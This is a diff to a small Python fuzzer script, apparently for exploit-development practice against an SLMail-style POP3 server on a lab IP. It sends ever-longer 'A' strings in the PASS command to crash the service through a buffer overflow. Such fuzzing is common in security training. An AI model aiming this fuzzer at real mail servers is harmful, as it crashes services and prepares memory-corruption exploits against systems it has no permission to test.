@@ -12,17 +12,19 @@ def Fuzzer():
 		buffer.append("A" * counter)
 		counter = counter + 500
 	try:
-		r = remote('192.168.80.133', 110)
+		# Used SLMail as template here, adjust accordingly!
+		r = remote('192.168.199.140', 110)
+		r.recv(2048)
 
 		for string in buffer:
 			print "Fuzzing with %s bytes of payload" %len(string)
-			r.send('USER username')
+			r.send('USER username\r\n')
 			r.recv(2048)
-			r.send('PASS ' + string)
+			r.send('PASS ' + string + '\r\n')
 			r.recv(2048)
 			time.sleep(1)
 	except:
-		print "Couldn't connect to target"
+		print "Couldn't connect to target, or you hit the jackpot!"
 
 
 def main():
@@ -36,7 +38,7 @@ def main():
 	| |F  | | |u  | | |z  | | |z  | | |M  | | |e  | |
 	| +---+ | +---+ | +---+ | +---+ | +---+ | +---+ |
 	|/_____\|/_____\|/_____\|/_____\|/_____\|/_____\|
-
+	by @ihack4falafel
 	'''
 	)
 
